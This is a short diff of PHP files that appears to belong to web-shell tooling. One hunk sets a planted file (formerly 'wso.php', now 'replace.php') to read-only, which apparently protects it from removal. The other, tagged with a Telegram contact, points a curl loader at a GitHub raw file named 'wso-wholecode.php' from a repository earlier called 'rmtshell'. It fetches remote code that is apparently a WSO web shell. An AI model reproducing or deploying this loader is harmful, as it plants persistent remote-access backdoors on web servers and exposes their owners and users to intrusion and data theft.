@@ -1,7 +1,7 @@
 <?php
 
 // Path to the file
-$file = 'wso.php';
+$file = 'replace.php';
 
 // Change the file permissions to 0444 (read-only)
 chmod($file, 0444);
@@ -10,7 +10,7 @@ chmod($file, 0444);
 
 <?php
 #telegram @Devidluice
-$remoteUrl = "https://raw.githubusercontent.com/uidr00t/rmtshell/main/wso-main-code.txt";
+$remoteUrl = "https://raw.githubusercontent.com/uidr00t/rere/main/wso-wholecode.php";
 $ch = curl_init($remoteUrl);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $remoteCode = curl_exec($ch);
